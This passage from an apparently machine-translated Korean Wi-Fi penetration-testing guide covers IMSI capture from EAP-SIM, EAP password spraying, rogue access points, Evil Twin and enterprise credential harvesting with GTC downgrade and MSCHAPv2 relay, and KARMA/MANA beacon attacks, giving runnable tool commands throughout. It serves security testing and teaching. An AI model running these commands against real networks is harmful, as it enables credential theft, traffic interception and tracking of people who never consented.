# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

참고:
- 배포가 보호된 신원/가명 없이 순수한 EAP‑SIM/AKA를 사용하는 경우 TLS 터널 이전에 작동합니다.
- 노출된 값은 가입자의 SIM에 연결된 영구 식별자입니다. 이를 수집하면 장기 추적 및 이후의 통신사 악용이 가능해집니다.

영향
- Privacy: 공공장소에서의 수동 Wi‑Fi 캡처로 인한 지속적인 사용자/장치 추적.
- Telecom abuse bootstrap: IMSI를 통해 SS7/Diameter 접근 권한을 가진 공격자가 위치 조회, 통화/SMS 가로채기 또는 MFA 탈취를 시도할 수 있습니다.

완화 방안 / 확인할 사항
- 클라이언트가 3GPP 권고(예: 3GPP TS 33.402)에 따라 익명 outer identities(가명)를 EAP‑SIM/AKA에 사용하고 있는지 확인하세요.
- 가능하면 신원 단계(identity phase)를 터널링(예: inner EAP‑SIM/AKA를 운반하는 EAP‑TTLS/PEAP)하여 IMSI가 평문으로 전송되지 않도록 하세요.
- association/auth의 패킷 캡처에서 EAP-Response/Identity에 원시 IMSI가 노출되어서는 안 됩니다.

관련: 캡처된 모바일 식별자를 이용한 통신 신호 악용
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

클라이언트가 **사용자 이름과 비밀번호**를 사용하도록 되어 있다면(이 경우 **EAP-TLS won't be valid**), **사용자 이름 목록**(다음 부분 참조)과 **비밀번호**를 확보한 뒤 [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**을 사용해 접근을 **bruteforce** 시도할 수 있습니다.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
이 공격은 `eaphammer`를 사용해서도 수행할 수 있습니다:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## 클라이언트 공격 이론

### Network Selection and Roaming

- The 802.11 protocol defines how a station joins an Extended Service Set (ESS) but does not specify the criteria for selecting an ESS or an access point (AP) within it.
- 스테이션은 동일한 ESSID를 공유하는 AP들 사이를 로밍할 수 있어, 건물이나 구역 전반에 걸쳐 연결을 유지할 수 있다.
- 프로토콜은 스테이션이 ESS에 대해 인증을 수행하도록 요구하지만 AP가 스테이션에게 인증하도록 요구하지는 않는다.

### Preferred Network Lists (PNLs)

- 스테이션은 연결한 모든 무선 네트워크의 ESSID를 Preferred Network List (PNL)에 저장하며, 네트워크별 구성 상세도 함께 저장한다.
- PNL은 알려진 네트워크에 자동으로 연결하는 데 사용되며, 연결 과정을 간소화해 사용성 향상을 제공한다.

### Passive Scanning

- AP는 주기적으로 beacon frames를 브로드캐스트하여 자신의 존재와 기능을 알리며, 브로드캐스트가 비활성화되어 있지 않다면 AP의 ESSID도 포함한다.
- 수동 스캐닝 동안 스테이션은 beacon frames를 수신한다. 비콘의 ESSID가 스테이션의 PNL 항목과 일치하면 스테이션은 해당 AP에 자동으로 연결할 수 있다.
- 장치의 PNL 정보를 알면 알려진 네트워크의 ESSID를 모방해 장치를 악성 AP에 연결시키는 식으로 잠재적인 악용이 가능하다.

### Active Probing

- Active probing은 스테이션이 probe requests를 보내 주변 AP와 그 특성을 탐지하는 과정이다.
- Directed probe requests는 특정 ESSID를 대상으로 하여, 해당 네트워크가 범위 내에 있는지(숨김 네트워크인 경우에도) 확인하는 데 도움을 준다.
- Broadcast probe requests는 SSID 필드가 null이며 모든 인근 AP로 전송되어, 스테이션이 PNL 내용을 노출하지 않고도 선호 네트워크가 있는지 확인할 수 있게 한다.

## Simple AP with redirection to Internet

더 복잡한 공격을 설명하기 전에, 단순히 AP를 생성하고 그 트래픽을 Internet에 연결된 인터페이스로 리디렉션하는 방법을 설명한다.

Using `ifconfig -a` check that the wlan interface to create the AP and the interface connected to the Internet are present.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
구성 파일 `/etc/dnsmasq.conf`을 생성합니다:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
그런 다음 **set IPs** 및 **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
그런 다음 dnsmasq를 **시작하세요**:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
구성 파일 `hostapd.conf` 생성:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**성가신 프로세스 중지** , 설정 **monitor mode**, 그리고 **시작 hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### 포워딩 및 리디렉션
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack는 WiFi 클라이언트가 네트워크를 인식하는 방식을 악용하며, 주로 네트워크 이름(ESSID)에 의존하고 base station (access point)이 클라이언트에게 스스로 인증할 것을 요구하지 않습니다. 핵심 사항은 다음과 같습니다:

- **구별의 어려움**: 장치들은 동일한 ESSID와 암호화 유형을 공유할 때 정당한 access points와 rogue access points를 구분하기 어렵습니다. 실제 네트워크는 종종 동일한 ESSID를 가진 여러 access point를 사용하여 커버리지를 매끄럽게 확장합니다.
- **클라이언트 로밍 및 연결 조작**: 802.11 프로토콜은 장치가 동일한 ESS 내의 access points 사이를 로밍하도록 허용합니다. 공격자는 장치가 현재 base station에서 연결을 끊고 rogue access point에 연결하도록 유도함으로써 이를 악용할 수 있습니다. 이는 더 강한 신호를 제공하거나 deauthentication packets 또는 jamming과 같은 방법으로 정당한 access point와의 연결을 방해함으로써 달성할 수 있습니다.
- **실행의 어려움**: 여러 개의 적절히 배치된 access points가 있는 환경에서는 evil twin attack을 성공적으로 수행하기 어렵습니다. 단일 정당한 access point를 deauthenticate하면 장치가 다른 정당한 access point에 연결되는 경우가 많으며, 공격자가 주변의 모든 access points를 deauthenticate하거나 rogue access point를 전략적으로 배치해야 합니다.

아래와 같이 매우 기본적인 Open Evil Twin(트래픽을 Internet으로 라우팅할 수 없음)을 만들 수 있습니다:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
또한 **eaphammer**를 사용하여 Evil Twin을 생성할 수도 있습니다 (eaphammer로 evil twins를 생성하려면 인터페이스가 **should NOT be** **monitor** 모드에 있어서는 안 됩니다):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
또는 Airgeddon을 사용: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

기본적으로 PNL에 있는 ESSID가 WPA로 보호된 것으로 저장되어 있으면, 기기는 자동으로 Open evil Twin에 연결되지 않는다는 점을 유의하세요. 실제 AP에 DoS를 시도해 사용자가 수동으로 당신의 Open evil twin에 연결하기를 기대할 수도 있고, 또는 실제 AP에 DoS를 가한 후 WPA Evil Twin을 사용해 handshake를 캡처할 수도 있습니다 (이 방법은 PSK를 모르는 상태에서는 피해자가 당신에게 연결하도록 할 수 없지만, handshake를 캡처하여 크랙을 시도할 수 있습니다).

_Some OS and AV will warn the user that connect to an Open network is dangerous..._

### WPA/WPA2 Evil Twin

당신은 **Evil Twin using WPA/2**를 생성할 수 있으며, 디바이스들이 해당 SSID에 WPA/2로 연결하도록 설정되어 있다면 연결을 시도할 것입니다. 어쨌든, **to complete the 4-way-handshake**하려면 클라이언트가 사용할 **비밀번호**를 **알고 있어야** 합니다. 만약 **모른다면**, **연결이 완료되지 않습니다**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

이 공격을 이해하려면 먼저 간단한 [WPA Enterprise explanation](#wpa-enterprise-mgt)를 읽어보는 것을 권합니다.

**hostapd-wpe 사용하기**

`hostapd-wpe`는 작동하려면 **설정** 파일이 필요합니다. 이러한 설정 파일들의 생성을 **자동화**하려면 [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad)를 사용할 수 있습니다 (_/etc/hostapd-wpe/_ 안에 있는 python 파일을 다운로드하세요)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
설정 파일에서 ssid, channel, user files, cret/key, dh parameters, wpa version 및 auth 등을 선택할 수 있습니다...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**EAPHammer 사용**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
기본적으로 EAPHammer는 다음 authentication methods를 사용합니다(GTC가 plaintext passwords를 얻기 위해 가장 먼저 시도되는 점에 유의하고, 그 후 더 강력한 auth methods를 사용합니다):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
이는 긴 연결 시간을 피하기 위한 기본 방법입니다. 그러나 authentication methods를 가장 약한 것에서 가장 강한 것 순서로 server에 지정할 수도 있습니다:
```
--negotiate weakest
```
Or you could also use:

- `--negotiate gtc-downgrade` to use highly efficient GTC downgrade implementation (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` to specify manually the methods offered (offering the same auth methods in the same order as the organisation the attack will be much more difficult to detect).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- 장치가 "do not validate certificate"로 구성되어 있으면, 클론된 AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`)가 **NetNTLMv2** (PEAP-MSCHAPv2) 또는 **cleartext** 자격증명을 수집합니다. `bettercap` deauth (`wifi.deauth <BSSID>`)는 프로브 중 숨겨진 SSID를 드러내고 재연결을 강제하며, PMF/802.11w가 스푸핑된 deauth를 차단하지 않는 한 유효합니다.
- Cracked NetNTLMv2는 재사용 가능한 Wi‑Fi/AD creds를 제공하며; GTC는 즉시 plaintext를 제공합니다.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- 무작위로 생성되어 크래킹이 불가능한 암호를 가진 머신 계정의 경우, **MSCHAPv2 relay**를 악용하세요: `hostapd-mana`를 Evil Twin으로 실행하여 MSCHAPv2 교환을 `wpa_sycophant`로 전달하고, `wpa_sycophant`는 동시에 정식 AP에 연결합니다. 리레이가 성공하면 비밀번호를 복구하지 않고도 인증된 Wi‑Fi 접근을 얻을 수 있습니다.
- 대상 보안 수준을 지원하는 빌드를 사용하세요 (WPA3/PMF는 최신 hostapd/wpa_supplicant가 필요합니다); PMF는 deauth 강제를 방지하므로 클라이언트가 자발적으로 연결할 때까지 기다리세요.

**Using Airgeddon**

`Airgeddon`은 이전에 생성된 certificated를 사용해 WPA/WPA2-Enterprise 네트워크에 EAP 인증을 제공할 수 있습니다. 가짜 네트워크는 연결 프로토콜을 EAP-MD5로 다운그레이드하여 **사용자와 비밀번호의 MD5**를 캡처할 수 있습니다. 이후 공격자는 비밀번호를 크랙하려 시도할 수 있습니다.\
`Airggedon`은 **continuous Evil Twin attack (noisy)** 또는 **only create the Evil Attack until someone connects (smooth)** 중 하나를 선택할 수 있는 기능을 제공합니다.

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_이 방법은 PEAP 연결에서 테스트되었지만, 임의의 TLS 터널을 복호화하기 때문에 EAP-TTLS에서도 작동해야 합니다._

**hostapd-wpe**의 구성 내에서 `_dh_file_`을 포함하는 줄을 주석 처리하세요 (from `dh_file=/etc/hostapd-wpe/certs/dh` to `#dh_file=/etc/hostapd-wpe/certs/dh`)\
이렇게 하면 `hostapd-wpe`가 DH 대신 RSA를 사용해 키를 교환하므로, 나중에 서버의 개인 키를 알고 있다면 트래픽을 **복호화**할 수 있습니다.

이제 수정된 구성으로 평소처럼 **Evil Twin**을 `hostapd-wpe`로 시작하세요. 또한 Evil Twin 공격을 수행하는 **인터페이스**에서 **wireshark**를 시작하세요.

지금 또는 나중에(이미 일부 인증 시도가 캡처된 경우) `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`에 개인 RSA 키를 wireshark에 추가할 수 있습니다.

새 항목을 추가하고 다음 값으로 양식을 채우세요: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**select your key file**, to avoid problems select a key file **without being password protected**).

![](<../../images/image (687).png>)

그리고 새로운 **"Decrypted TLS" tab**을 확인하세요:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Different types of Media Access Control Filter Lists (MFACLs) and their corresponding modes and effects on the behavior of a rogue Access Point (AP):

1. **MAC-based Whitelist**:
- rogue AP는 화이트리스트에 명시된 장치의 probe request에만 응답하며, 목록에 없는 다른 모든 장치에는 보이지 않습니다.
2. **MAC-based Blacklist**:
- rogue AP는 블랙리스트에 있는 장치의 probe request를 무시하여, 해당 특정 장치들에게는 rogue AP가 보이지 않도록 합니다.
3. **SSID-based Whitelist**:
- rogue AP는 목록에 있는 특정 ESSID에 대한 probe request에만 응답하므로, Preferred Network Lists(PNL)에 해당 ESSID가 없는 장치에는 보이지 않습니다.
4. **SSID-based Blacklist**:
- rogue AP는 블랙리스트에 있는 특정 ESSID에 대한 probe request에 응답하지 않아, 해당 네트워크를 찾는 장치들에게는 보이지 않습니다.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

이 방법은 네트워크에 연결하려는 장치들의 모든 probe requests에 응답하는 악성 access point (AP)를 공격자가 생성할 수 있게 합니다. 이 기술은 장치가 찾고 있는 네트워크를 흉내 내어 장치가 공격자의 AP에 연결되도록 속입니다. 장치가 이 rogue AP로 연결 요청을 보내면 연결이 완료되어 장치가 공격자의 네트워크에 잘못 연결됩니다.

### MANA

그 후, 장치들은 불확실한 네트워크 응답을 무시하기 시작하여 원래의 KARMA 공격의 효과가 감소했습니다. 그러나 Ian de Villiers와 Dominic White가 소개한 새로운 방법인 MANA 공격이 등장했습니다. 이 방법은 rogue AP가 장치들의 broadcast probe requests에 대해 장치들이 이전에 저장한 네트워크 이름(SSIDs)으로 응답함으로써 Preferred Network Lists (PNL)를 캡처하는 것을 포함합니다. 이 정교한 공격은 장치들이 알려진 네트워크를 기억하고 우선순위를 매기는 방식을 악용하여 원래 KARMA 공격에 대한 보호를 우회합니다.

MANA 공격은 장치들로부터 오는 directed 및 broadcast probe requests를 모두 모니터링하여 작동합니다. directed 요청의 경우, 장치의 MAC 주소와 요청된 네트워크 이름을 기록하여 이 정보를 목록에 추가합니다. broadcast 요청이 수신되면 AP는 장치 목록의 네트워크 중 하나와 일치하는 정보로 응답하여 장치를 rogue AP에 연결되도록 유도합니다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack**은 장치들이 directed probing을 사용하지 않거나 공격자가 그들의 선호 네트워크 목록 (PNL)을 모를 때 사용하는 고급 전략이다. 이 공격은 **같은 지역에 있는 장치들은 PNL에서 일부 네트워크 이름을 공유할 가능성이 높다**는 원칙에 따라 작동한다. 선택적으로 응답하는 대신, 이 공격은 관찰된 모든 장치의 결합된 PNL에서 발견된 모든 네트워크 이름(ESSID)에 대해 probe responses를 브로드캐스트한다. 이러한 광범위한 방식은 장치가 익숙한 네트워크를 인식하고 rogue Access Point (AP)에 연결을 시도할 가능성을 높인다.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

**Loud MANA attack**가 충분하지 않을 때, **Known Beacon attack**은 또 다른 접근법을 제시한다. 이 방법은 워드리스트에서 파생된 후보 ESSIDs 목록을 사용하여, **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs**. 이는 수많은 네트워크가 존재하는 것처럼 시뮬레이션하여 피해자의 PNL 내 ESSID와 일치하기를 기대하고, 그 결과 만들어진 AP에 연결을 시도하게 만든다. 공격은 장치를 더 적극적으로 유인하기 위해 `--loud` 옵션과 결합하여 증폭할 수 있다.

Eaphammer는 이 공격을 리스트 안의 모든 ESSIDs가 제공되는 MANA attack으로 구현했다(you could also combine this with `--loud` to create a Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Known Beacon Burst attack은 파일에 나열된 각 ESSID에 대해 beacon frames를 연속적으로 브로드캐스트하는 것을 포함합니다. 이로 인해 가짜 네트워크가 밀집한 환경이 형성되어, 특히 MANA attack과 결합하면 디바이스가 rogue AP에 연결할 가능성이 크게 증가합니다. 이 기술은 속도와 양을 이용해 디바이스의 네트워크 선택 메커니즘을 압도합니다.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct**는 전통적인 무선 액세스 포인트 없이 Wi-Fi를 이용해 기기들끼리 직접 연결되도록 하는 프로토콜입니다. 이 기능은 프린터나 텔레비전과 같은 다양한 Internet of Things (IoT) 장치에 통합되어 장치 간 직접 통신을 용이하게 합니다. Wi-Fi Direct의 특징 중 하나는 한 기기가 연결을 관리하기 위해 group owner 역할을 맡는다는 점입니다.

Wi-Fi Direct 연결의 보안은 **Wi-Fi Protected Setup (WPS)**을 통해 설정되며, 안전한 페어링을 위한 여러 방법을 지원합니다. 예를 들면:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

이들 방법은 특히 PIN entry가 기존 Wi-Fi 네트워크의 WPS와 동일한 취약점에 노출될 수 있어 유사한 공격 벡터의 대상이 됩니다.

### EvilDirect Hijacking

**EvilDirect Hijacking**은 Wi-Fi Direct에 특화된 공격입니다. 이는 Evil Twin 공격 개념을 그대로 따르지만 Wi-Fi Direct 연결을 대상으로 합니다. 이 시나리오에서 공격자는 합법적인 group owner를 사칭하여 장치들이 악성 엔티티에 연결되도록 속이려 합니다. 이 방법은 `airbase-ng`와 같은 도구를 사용해 사칭 대상 기기의 channel, ESSID, MAC address를 지정하여 실행할 수 있습니다:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: 다음을 확인하세요 [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (Facebook 로그인 및 captive portals에서의 WPA 모방)

{{#include ../../banners/hacktricks-training.md}}
